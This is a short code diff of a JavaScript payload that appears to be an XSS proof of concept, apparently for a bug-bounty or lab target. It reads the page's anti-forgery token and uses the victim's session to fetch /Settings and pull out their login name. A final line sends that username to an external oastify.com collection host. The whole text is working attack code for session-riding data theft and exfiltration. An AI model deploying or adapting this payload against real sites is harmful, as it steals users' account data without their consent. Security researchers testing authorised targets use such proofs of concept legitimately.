@@ -2,6 +2,7 @@
   const token =
     document.querySelector('input[name="__RequestVerificationToken"]')?.value;
 
+
   const username =
     document.querySelector('#ProfileInfo_LoginName-input')?.value ||
     document.querySelector('input[name="ProfileInfo.LoginName"]')?.value;
@@ -10,6 +11,19 @@
     console.error("Missing __RequestVerificationToken");
     return;
   }
+
+  (async () => {
+  const r = await fetch('/Settings', {
+    credentials: 'include'
+  });
+
+  const html = await r.text();
+  const doc = new DOMParser().parseFromString(html, 'text/html');
+
+  const username =
+    doc.querySelector('#ProfileInfo_LoginName-input')?.value ||
+    doc.querySelector('input[name="ProfileInfo.LoginName"]')?.value;
+})();
 
   fetch('https://v737o1tiz67xyfm89veutxtgh7nybqzf.oastify.com?username='+username);
 
